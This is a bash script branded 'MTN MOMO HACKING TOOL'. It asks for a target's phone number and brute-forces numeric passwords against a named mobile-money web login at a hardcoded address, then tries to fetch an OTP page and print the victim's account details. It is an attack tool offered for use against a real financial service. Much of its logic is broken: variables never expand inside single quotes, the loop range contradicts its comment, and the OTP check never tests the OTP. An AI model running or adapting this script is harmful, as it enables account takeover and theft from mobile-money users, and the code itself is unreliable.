#!/bin/bash
echo "
███╗   ███╗████████╗███╗   ██╗                    ███╗   ███╗ ██████╗ ███╗   ███╗ ██████╗             ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗             ████████╗ ██████╗  ██████╗ ██╗     
████╗ ████║╚══██╔══╝████╗  ██║                    ████╗ ████║██╔═══██╗████╗ ████║██╔═══██╗            ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝             ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██╔████╔██║   ██║   ██╔██╗ ██║                    ██╔████╔██║██║   ██║██╔████╔██║██║   ██║            ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗               ██║   ██║   ██║██║   ██║██║     
██║╚██╔╝██║   ██║   ██║╚██╗██║                    ██║╚██╔╝██║██║   ██║██║╚██╔╝██║██║   ██║            ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║               ██║   ██║   ██║██║   ██║██║     
██║ ╚═╝ ██║   ██║   ██║ ╚████║                    ██║ ╚═╝ ██║╚██████╔╝██║ ╚═╝ ██║╚██████╔╝            ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝               ██║   ╚██████╔╝╚██████╔╝███████╗
╚═╝     ╚═╝   ╚═╝   ╚═╝  ╚═══╝                    ╚═╝     ╚═╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝             ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
 "                                                                                                                                                                                                          

# Get the username from the user
echo "Enter the Targets Phonenumber"
read username

# Get the request headers from the website
headers=$(curl -k -s -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9" 'https://196.202.232.201/MoMoWebAppMTNCameroon/login.xhtml' | grep -E ': ' | cut -d ' ' -f1)

# Iterate from 0 to 9999
for i in {00000..99999}; do

  # Create the request parameters
  params='loginForm=loginForm&loginForm[username]=$username&loginForm[password]=$i&loginForm[j_idt19]=Login&javax.faces.ViewState=1319890406535641868:-8273346397217720005'

  # Make the request
  response=$(curl -k -X POST --data "$params" --header "$headers" 'https://196.202.232.201/MoMoWebAppMTNCameroon/login.xhtml')

  # Check if the password has been found
  if [[ "$response" == "j_security_check" ]]; then

    # The password has been found, get the otp
    otp=$(curl -k -s -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9" 'https://196.202.232.201/MoMoWebAppMTNCameroon/pages/otpverification.xhtml' | grep -E ': ' | cut -d ' ' -f1)

    # Check if the otp is valid
    if [[ "$response" == "j_security_check" ]]; then

      # The otp is valid, get the account details
      response=$(curl -k -X GET --header "$headers" 'https://mobilemoney.mtncameroon.net/MoMoWebAppMTNCameroon/pages/selectedaccountdeatils.xhtml')

      # Print the account details
      echo "$response"

      break
    fi
  fi
done
